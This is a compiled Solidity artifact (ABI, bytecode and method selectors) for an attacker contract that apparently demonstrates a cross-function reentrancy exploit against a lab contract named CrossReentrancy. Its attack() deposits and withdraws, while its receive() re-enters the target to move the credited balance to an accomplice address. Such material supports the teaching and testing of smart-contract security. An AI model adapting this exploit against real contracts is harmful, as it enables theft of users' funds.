{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"},{"name":"_accomplice","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"accomplice","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract CrossReentrancy"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405161039f38038061039f833981016040819052602b916074565b5f80546001600160a01b039384166001600160a01b0319918216179091556001805492909316911617905560a0565b80516001600160a01b0381168114606f575f5ffd5b919050565b5f5f604083850312156084575f5ffd5b608b83605a565b9150609760208401605a565b90509250929050565b6102f2806100ad5f395ff3fe608060405260043610610041575f3560e01c806312065fe01461013a5780639e5faafc14610159578063d12fd49a14610161578063d4b8399214610198575f5ffd5b3661013657600154600160a01b900460ff1615610134576001805460ff60a01b1981169091555f546040516327e235e360e01b81523060048201526001600160a01b039182169263a9059cbb92169083906327e235e390602401602060405180830381865afa1580156100b6573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100da91906102a5565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044015f604051808303815f87803b15801561011d575f5ffd5b505af115801561012f573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b348015610145575f5ffd5b506040514781526020015b60405180910390f35b6101346101b6565b34801561016c575f5ffd5b50600154610180906001600160a01b031681565b6040516001600160a01b039091168152602001610150565b3480156101a3575f5ffd5b505f54610180906001600160a01b031681565b670de0b6b3a76400003410156101ca575f5ffd5b5f805460408051630d0e30db60e41b815290516001600160a01b039092169263d0e30db092670de0b6b3a764000092600480820193929182900301818588803b158015610215575f5ffd5b505af1158015610227573d5f5f3e3d5ffd5b50506001805460ff60a01b1916600160a01b17905550505f805460408051633ccfd60b60e01b815290516001600160a01b039092169350633ccfd60b92600480830193919282900301818387803b158015610280575f5ffd5b505af1158015610292573d5f5f3e3d5ffd5b50506001805460ff60a01b191690555050565b5f602082840312156102b5575f5ffd5b505191905056fea2646970667358221220034109ca14e134a9a113fc7f0df8d761ddc1e7d1c17d98ad2e6e8e28a4ffb2de64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"accomplice()":"d12fd49a","attack()":"9e5faafc","getBalance()":"12065fe0","target()":"d4b83992"},"id":19}